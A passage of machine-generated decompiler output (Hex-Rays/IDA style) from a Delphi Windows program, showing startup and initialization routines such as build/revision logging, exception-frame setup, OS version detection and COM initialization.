  DWORD v11; // eax
  int v12; // ecx
  int v13; // edx
  int v14; // ebx
  int v16; // [esp+2Ch] [ebp-5Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *v17; // [esp+30h] [ebp-58h] BYREF
  void *v18; // [esp+34h] [ebp-54h]
  const wchar_t *v19; // [esp+38h] [ebp-50h]
  struct _EXCEPTION_REGISTRATION_RECORD *v20; // [esp+3Ch] [ebp-4Ch] BYREF
  const wchar_t *v21; // [esp+40h] [ebp-48h]
  int *v22; // [esp+44h] [ebp-44h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+48h] [ebp-40h] BYREF
  double v24; // [esp+4Ch] [ebp-3Ch]
  void *v25; // [esp+54h] [ebp-34h]
  int v26; // [esp+60h] [ebp-28h] BYREF
  void *v27; // [esp+64h] [ebp-24h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v28; // [esp+68h] [ebp-20h] BYREF
  int *v29; // [esp+6Ch] [ebp-1Ch] BYREF
  int v30; // [esp+70h] [ebp-18h] BYREF
  int v31; // [esp+74h] [ebp-14h] BYREF
  _DWORD *v32; // [esp+78h] [ebp-10h]
  struct _EXCEPTION_REGISTRATION_RECORD *v33; // [esp+7Ch] [ebp-Ch] BYREF
  char v34; // [esp+82h] [ebp-6h]
  char v35; // [esp+83h] [ebp-5h]
  int *v36; // [esp+84h] [ebp-4h] BYREF
  int savedregs; // [esp+88h] [ebp+0h] BYREF

  v34 = _InterlockedExchange((volatile __int32 *)&v36, a3);
  v35 = a2;
  v36 = a1;
  HIDWORD(v24) = &savedregs;
  LODWORD(v24) = &loc_45ECF6;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v22 = &savedregs;
  v21 = (const wchar_t *)&loc_45EBF1;
  v20 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v20);
  sub_406C44(&v33);
  v32 = (_DWORD *)sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
  v19 = (const wchar_t *)&savedregs;
  v18 = &loc_45EBB7;
  v17 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v17);
  sub_432480(*v36, (int)v32, a5);
  sub_4289A0((int)v32, (int)&v31);
  sub_4079F0((int *)&v33, 3);
  __writefsdword(0, (unsigned int)L"\r\n");
  sub_405598(v32);
  Sysutils::Now();
  v24 = a6;
  ExceptionList = v33;
  LOBYTE(v6) = 3;
  (*(void (__fastcall **)(int *, int, struct _EXCEPTION_REGISTRATION_RECORD *))*v36)(v36, v6, v33);
  sub_433BE0((int)v36, (int)v33, 0);
  __writefsdword(0, (unsigned int)ExceptionList);
  sub_432460();
  HIDWORD(v24) = L"BuildId=";
  sub_415150(1569, &v30);
  LODWORD(v24) = v30;
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)L" Revision=";
  sub_415150(53606, (int *)&v29);
  v22 = v29;
  v21 = L" MainThread=";
  v7 = sub_4239B0();
  sub_415178((int *)&v28, 0, v8, (unsigned int)v7);
  v20 = v28;
  v19 = L" pid=";
  v9 = sub_423990();
  sub_415178((int *)&v27, 0, v10, v9);
  v18 = v27;
  v17 = (struct _EXCEPTION_REGISTRATION_RECORD *)&str___9[1];
  v11 = sub_4239A0();
  sub_415178(&v26, 0, v12, v11);
  v16 = v26;
  sub_4079F0((int *)&v33, 10);
  Sysutils::Now();
  LOBYTE(v13) = 3;
  v14 = *v36;
  (*(void (__fastcall **)(int *, int, struct _EXCEPTION_REGISTRATION_RECORD *, struct _EXCEPTION_REGISTRATION_RECORD *, int *, const wchar_t *, struct _EXCEPTION_REGISTRATION_RECORD *, const wchar_t *, void *, struct _EXCEPTION_REGISTRATION_RECORD *, int, _DWORD, _DWORD, struct _EXCEPTION_REGISTRATION_RECORD *))*v36)(
    v36,
    v13,
    v33,
    ExceptionList,
    v22,
    v21,
    v20,
    v19,
    v18,
    v17,
    v16,
    HIDWORD(COERCE_UNSIGNED_INT64(a6)),
    COERCE_UNSIGNED_INT64(a6),
    v33);
  sub_433BE0((int)v36, (int)v33, 0);
  if ( v36[12] )
  {
    sub_459600(v36[12], v14, a4, a5);
    sub_406C68(v36 + 12);
  }
  __writefsdword(0, LODWORD(v24));
  v25 = &loc_45ECFD;
  sub_406CA4((int)&v26, 6);
  return sub_406C44(&v33);
}
// 45EBD8: variable 'v6' is possibly undefined
// 45EC44: variable 'v8' is possibly undefined
// 45EC5D: variable 'v10' is possibly undefined
// 45EC76: variable 'v12' is possibly undefined
// 45ECA5: variable 'v13' is possibly undefined
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();
// 45ED10: using guessed type wchar_t asc_45ED10[3];
// 45ED24: using guessed type wchar_t aBuildid[9];
// 45ED44: using guessed type wchar_t aRevision[11];
// 45ED68: using guessed type wchar_t aMainthread[13];
// 45ED90: using guessed type wchar_t aPid_0[6];
// 45EDA0: using guessed type _strings str___9[1];
// 45EB10: using guessed type struct _EXCEPTION_REGISTRATION_RECORD *var_C;

//----- (0045EDB0) --------------------------------------------------------
int sub_45EDB0()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_45EE31;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_46F6CC )
  {
    unknown_libname_94(&dword_467E8C);
    sub_406C44(&dword_46F6D0);
    sub_406C44(&dword_46F6DC);
    sub_406C44(&dword_46F6E0);
    sub_406C44(&dword_46F6E4);
    sub_406C44(&dword_46F6E8);
    sub_406C44(&dword_46F6EC);
    sub_406C44(&dword_46F6F8);
    sub_406C44(&dword_46F6FC);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);
// 467E8C: using guessed type int dword_467E8C;
// 46F6CC: using guessed type int dword_46F6CC;
// 46F6D0: using guessed type int dword_46F6D0;
// 46F6E0: using guessed type int dword_46F6E0;
// 46F6FC: using guessed type int dword_46F6FC;

//----- (00464000) --------------------------------------------------------
int sub_464000()
{
  int v1; // eax
  int result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-Ch] BYREF
  void *v4; // [esp-8h] [ebp-8h]
  int *v5; // [esp-4h] [ebp-4h]
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v5 = &savedregs;
  v4 = &loc_4640D7;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( dword_469988-- == 0 )
  {
    sub_4054A8(ExceptionList, v4, v5);
    sub_404B4C();
    SetThreadLocale(0x400u);
    sub_408E5C();
    byte_46500C = 2;
    dword_46901C = (int)RaiseException;
    dword_469020 = (int)RtlUnwind;
    byte_469056 = 2;
    dword_46905C = sub_40B5D0();
    dword_469008 = (int)sub_408564;
    v1 = sub_4054E4();
    sub_405500(v1);
    word_469064 = -10320;
    word_469340 = -10320;
    word_46961C = -10320;
    dword_46904C = (int)GetCommandLineW();
    dword_469048 = sub_402FC4();
    cchWideChar = GetACP();
    dword_46997C = 1200;
    dword_469040 = GetCurrentThreadId();
    sub_40B5E4();
  }
  result = 0;
  __writefsdword(0, (unsigned int)ExceptionList);
  return result;
}
// 4054A8: using guessed type int __cdecl sub_4054A8(_DWORD, _DWORD, _DWORD);
// 4054E4: using guessed type int sub_4054E4(void);
// 405500: using guessed type int __fastcall sub_405500(_DWORD);
// 46500C: using guessed type char byte_46500C;
// 469008: using guessed type int dword_469008;
// 46901C: using guessed type int dword_46901C;
// 469020: using guessed type int dword_469020;
// 469040: using guessed type int dword_469040;
// 469048: using guessed type int dword_469048;
// 46904C: using guessed type int dword_46904C;
// 469056: using guessed type char byte_469056;
// 46905C: using guessed type int dword_46905C;
// 469064: using guessed type __int16 word_469064;
// 469340: using guessed type __int16 word_469340;
// 46961C: using guessed type __int16 word_46961C;
// 46997C: using guessed type int dword_46997C;
// 469988: using guessed type int dword_469988;

//----- (004640E0) --------------------------------------------------------
void sub_4640E0()
{
  --dword_46C634;
}
// 46C634: using guessed type int dword_46C634;

//----- (004640F0) --------------------------------------------------------
HMODULE sub_4640F0()
{
  HMODULE result; // eax

  if ( dword_46C63C-- == 0 )
  {
    result = (HMODULE)off_46815C;
    if ( *off_46815C )
    {
      result = *(HMODULE *)(*off_46815C + 4);
      if ( result == hModule )
      {
        result = (HMODULE)*off_46815C;
        if ( !*(_DWORD *)(*off_46815C + 16) )
        {
          result = (HMODULE)*off_46815C;
          *(_DWORD *)(*off_46815C + 16) = hModule;
        }
      }
    }
  }
  return result;
}
// 46815C: using guessed type int *off_46815C;
// 46C63C: using guessed type int dword_46C63C;

//----- (00464198) --------------------------------------------------------
void __usercall sub_464198(int a1@<ebx>)
{
  int v2; // [esp+0h] [ebp-14Ch] BYREF
  int v3; // [esp+4h] [ebp-148h] BYREF
  int v4; // [esp+8h] [ebp-144h] BYREF
  struct _SYSTEM_INFO SystemInfo; // [esp+Ch] [ebp-140h] BYREF
  struct _OSVERSIONINFOW VersionInformation; // [esp+30h] [ebp-11Ch] BYREF
  unsigned __int16 v7; // [esp+144h] [ebp-8h]
  unsigned __int16 v8; // [esp+146h] [ebp-6h]
  char v9; // [esp+14Ah] [ebp-2h]

  if ( dword_46C78C-- == 0 )
  {
    sub_4051B8(&VersionInformation, 284, 0);
    VersionInformation.dwOSVersionInfoSize = 284;
    GetVersionExW_1(&VersionInformation);
    byte_46C780 = 0;
    dword_46C774 = VersionInformation.dwMajorVersion;
    dword_46C778 = VersionInformation.dwMinorVersion;
    dword_46C770 = VersionInformation.dwBuildNumber;
    dword_46C784 = v7;
    dword_46C788 = v8;
    sub_4051B8(&SystemInfo, 36, 0);
    if ( (unsigned __int8)Sysutils::CheckWin32Version(5, 1) )
      GetNativeSystemInfo(&SystemInfo);
    byte_46C76C = byte_466568[SystemInfo.wProcessorArchitecture == 9];
    if ( dword_46C774 > 6 || dword_46C774 == 6 && dword_46C778 > 1 )
    {
      if ( (unsigned __int8)sub_41B3B4((__int32)L"kernel32.dll", &v2, &v3, &v4) )
      {
        dword_46C774 = v2;
        dword_46C778 = v3;
        dword_46C770 = v4;
      }
      else if ( (unsigned __int8)sub_41B30C(&v2, &v3, a1) )
      {
        dword_46C774 = v2;
        dword_46C778 = v3;
      }
    }
    sub_40B51C((int **)off_4681B4, &dword_46C77C);
    if ( dword_46C774 == 5 )
    {
      if ( !dword_46C778 )
      {
        sub_40B51C((int **)off_4681E8, &dword_46C77C);
        return;
      }
      if ( dword_46C778 == 1 )
        goto LABEL_43;
      if ( dword_46C778 != 2 )
        return;
      if ( v9 == 1 && SystemInfo.wProcessorArchitecture == 9 )
      {
LABEL_43:
        sub_40B51C((int **)off_4680B0, &dword_46C77C);
        return;
      }
      if ( GetSystemMetrics(89) )
        sub_40B51C((int **)off_468164, &dword_46C77C);
      else
        sub_40B51C((int **)off_467EC8, &dword_46C77C);
    }
    else if ( dword_46C774 == 6 )
    {
      if ( dword_46C778 )
      {
        switch ( dword_46C778 )
        {
          case 1:
            if ( v9 == 1 )
              sub_40B51C((int **)off_4681EC, &dword_46C77C);
            else
              sub_40B51C((int **)off_468028, &dword_46C77C);
            break;
          case 2:
            if ( v9 == 1 )
              sub_40B51C((int **)off_467EC0, &dword_46C77C);
            else
              sub_40B51C((int **)off_467EDC, &dword_46C77C);
            break;
          case 3:
            if ( sub_41C704() )
              sub_40B51C((int **)off_468178, &dword_46C77C);
            else
              sub_40B51C((int **)off_468160, &dword_46C77C);
            break;
        }
      }
      else if ( v9 == 1 )
      {
        sub_40B51C((int **)off_46804C, &dword_46C77C);
      }
      else
      {
        sub_40B51C((int **)off_4680FC, &dword_46C77C);
      }
    }
    else if ( dword_46C774 == 10 && !dword_46C778 )
    {
      if ( sub_41C704() )
        sub_40B51C((int **)off_468150, &dword_46C77C);
      else
        sub_40B51C((int **)off_46812C, &dword_46C77C);
    }
  }
}
// 4644A0: using guessed type wchar_t aKernel32Dll_7[13];
// 46C76C: using guessed type char byte_46C76C;
// 46C770: using guessed type int dword_46C770;
// 46C774: using guessed type int dword_46C774;
// 46C778: using guessed type int dword_46C778;
// 46C77C: using guessed type _DWORD dword_46C77C;
// 46C780: using guessed type char byte_46C780;
// 46C784: using guessed type int dword_46C784;
// 46C788: using guessed type int dword_46C788;
// 46C78C: using guessed type int dword_46C78C;

//----- (004644BC) --------------------------------------------------------
int __usercall sub_4644BC@<eax>(int a1@<edi>)
{
  int v2; // eax
  int v3; // ecx
  int result; // eax
  unsigned int v5[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_464552;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  if ( dword_46C790-- == 0 )
  {
    sub_4067AC(&dword_41C780);
    System::__linkproc__ InitImports(&dword_41C7D8);
    if ( byte_46C61D )
      sub_406FE8((volatile __int32 *)&off_465E28, (int)L"0x");
    sub_41B230();
    Sysutils::AddTerminateProc((bool (__fastcall *)())sub_41BC58);
    v2 = sub_41B35C();
    unknown_libname_93(v2);
    sub_409A40(0, (int)&dword_466564);
    dword_46C794 = 0;
    dword_46C7A0 = sub_405568((int)&cls_System_TObject, 1);
    sub_41B988(v3, a1);
  }
  result = 0;
  __writefsdword(0, v5[0]);
  return result;
}
// 46453F: variable 'v3' is possibly undefined
// 401530: using guessed type __int16 cls_System_TObject;
// 4067F4: using guessed type int __fastcall System::__linkproc__ InitImports(_DWORD);
// 41BE64: using guessed type int __fastcall unknown_libname_93(_DWORD);
// 41C780: using guessed type int dword_41C780;
// 41C7D8: using guessed type int dword_41C7D8;
// 464568: using guessed type wchar_t a0x_1[3];
// 465E28: using guessed type int *off_465E28;
// 466564: using guessed type _DWORD dword_466564;
// 46C61D: using guessed type char byte_46C61D;
// 46C790: using guessed type int dword_46C790;
// 46C794: using guessed type int dword_46C794;
// 46C7A0: using guessed type int dword_46C7A0;

//----- (00464580) --------------------------------------------------------
int sub_464580()
{
  int result; // eax
  unsigned int v2[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_46462F;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( dword_46E90C-- == 0 )
  {
    dword_46E8FC = (int)sub_41E6A4;
    dword_46E900 = (int (__fastcall *)(_DWORD))sub_41E2CC;
    dword_46E904 = (int (__fastcall *)(_DWORD, _DWORD))sub_41E2C4;
    dword_46E908 = (int (__fastcall *)(_DWORD))sub_41E2CC;
    *off_468044 = (int)sub_41E87C;
    *(_DWORD *)off_467ED8 = unknown_libname_118;
    *off_4680C8 = (int)sub_41EBD0;
    *(_DWORD *)off_4681C4 = sub_41EEF0;
    *(_DWORD *)off_4680D8 = sub_41F908;
    *(_DWORD *)off_467EF8 = sub_420128;
    dword_46E914 = sub_405568((int)&cls_System_TObject, 1);
  }
  result = 0;
  __writefsdword(0, v2[0]);
  return result;
}
// 401530: using guessed type __int16 cls_System_TObject;
// 420838: using guessed type int unknown_libname_118();
// 467ED8: using guessed type void *off_467ED8;
// 467EF8: using guessed type void *off_467EF8;
// 468044: using guessed type int *off_468044;
// 4680C8: using guessed type int *off_4680C8;
// 4680D8: using guessed type void *off_4680D8;
// 4681C4: using guessed type void *off_4681C4;
// 46E8FC: using guessed type int dword_46E8FC;
// 46E900: using guessed type int (__fastcall *dword_46E900)(_DWORD);
// 46E904: using guessed type int (__fastcall *dword_46E904)(_DWORD, _DWORD);
// 46E908: using guessed type int (__fastcall *dword_46E908)(_DWORD);
// 46E90C: using guessed type int dword_46E90C;
// 46E914: using guessed type int dword_46E914;

//----- (00464660) --------------------------------------------------------
void sub_464660()
{
  if ( dword_46E958-- == 0 )
  {
    dword_46E950 = 0;
    dword_46E954 = 0;
  }
}
// 46E950: using guessed type int dword_46E950;
// 46E954: using guessed type int dword_46E954;
// 46E958: using guessed type int dword_46E958;

//----- (00464680) --------------------------------------------------------
_DWORD *sub_464680()
{
  unsigned int v2[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v3; // [esp-4h] [ebp-10h]
  int v4; // [esp+0h] [ebp-Ch] BYREF
  int v5; // [esp+4h] [ebp-8h] BYREF
  __int64 *v6; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v6 = 0;
  v5 = 0;
  v4 = 0;
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_464732;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( dword_46E95C-- == 0 )
  {
    dword_46691C = GetCurrentThreadId_0();
    qword_46E960 = 0i64;
    v6 = &qword_46E968;
    qword_46E968 = 0i64;
    if ( *off_467EC4 )
      dword_466834 = (__int64 (__cdecl *)(_DWORD, _DWORD, _DWORD))*off_467EC4;
    else
      dword_466834 = (__int64 (__cdecl *)(_DWORD, _DWORD, _DWORD))sub_4237C0;
    sub_426040(0, &v4);
    sub_426830(v4, &v5);
    sub_423910(v5);
  }
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_464739;
  sub_406C44(&v4);
  return sub_406C44(&v5);
}
// 466834: using guessed type __int64 (__cdecl *dword_466834)(_DWORD, _DWORD, _DWORD);
// 46691C: using guessed type int dword_46691C;
// 467EC4: using guessed type int *off_467EC4;
// 46E95C: using guessed type int dword_46E95C;
// 46E960: using guessed type __int64 qword_46E960;
// 46E968: using guessed type __int64 qword_46E968;

//----- (00464740) --------------------------------------------------------
int sub_464740()
{
  int v1; // eax
  int result; // eax
  unsigned int v3[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v3[2] = (unsigned int)&savedregs;
  v3[1] = (unsigned int)&loc_464795;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  if ( dword_46EAB4-- == 0 )
  {
    v1 = sub_407DEC((int)&unk_46EAB8, (int)&byte_413DFC);
    sub_4250F0(v1);
    word_46EB7A = 46;
    sub_406FE8(&dword_46EAB0, (int)&dword_4647AC);
  }
  result = 0;
  __writefsdword(0, v3[0]);
  return result;
}
// 413DFC: using guessed type char byte_413DFC;
// 4647AC: using guessed type int dword_4647AC;
// 46EAB0: using guessed type _DWORD dword_46EAB0;
// 46EAB4: using guessed type int dword_46EAB4;
// 46EB7A: using guessed type __int16 word_46EB7A;

//----- (004647B0) --------------------------------------------------------
int sub_4647B0()
{
  int result; // eax

  if ( unk_46EB84-- == 0 )
  {
    sub_42A140();
    return sub_42A200(0, 1569, 53606);
  }
  return result;
}

//----- (00464850) --------------------------------------------------------
void sub_464850()
{
  --dword_46EDA4;
}
// 46EDA4: using guessed type int dword_46EDA4;

//----- (00464890) --------------------------------------------------------
char *sub_464890()
{
  char *result; // eax

  if ( dword_46EDC0-- == 0 )
  {
    result = off_467F44;
    *off_467F44 = 1;
  }
  return result;
}
// 467F44: using guessed type char *off_467F44;
// 46EDC0: using guessed type int dword_46EDC0;

//----- (004648E0) --------------------------------------------------------
int sub_4648E0()
{
  long double v1; // fst7
  int result; // eax
  char v3[8]; // [esp+0h] [ebp-8h] BYREF

  if ( dword_46EDCC-- == 0 )
  {
    Sysutils::DateTimeToTimeStamp(dbl_467480);
    v1 = Sysutils::TimeStampToMSecs(v3);
    qword_46EDD0 = (__int64)v1;
    return sub_4430C0(v1);
  }
  return result;
}
// 41760C: using guessed type long double __fastcall Sysutils::TimeStampToMSecs(_DWORD);
// 46EDCC: using guessed type int dword_46EDCC;
// 46EDD0: using guessed type __int64 qword_46EDD0;
// 4648E0: using guessed type char var_8[8];

//----- (00464940) --------------------------------------------------------
HRESULT sub_464940()
{
  HRESULT result; // eax

  if ( dword_46EEA4-- == 0 )
    return CoInitialize(0);
  return result;
}
// 46EEA4: using guessed type int dword_46EEA4;

//----- (00464970) --------------------------------------------------------
int sub_464970()
{
  int result; // eax

  if ( dword_46F6A0-- == 0 )
  {
    result = 0;
    dword_46F698 = 0;
    LOBYTE(dword_46F69C) = 0;
  }
  return result;
}
// 46F698: using guessed type int dword_46F698;
// 46F69C: using guessed type int dword_46F69C;
// 46F6A0: using guessed type int dword_46F6A0;

//----- (00464988) --------------------------------------------------------
int *sub_464988()
{
  int *result; // eax

  if ( dword_46F6A4-- == 0 )
    return sub_451C3C();
  return result;
}
// 46F6A4: using guessed type int dword_46F6A4;

// nfuncs=2088 queued=1418 decompiled=1418 lumina nreq=0 worse=0 better=0
// ALL OK, 1418 function(s) have been successfully decompiled
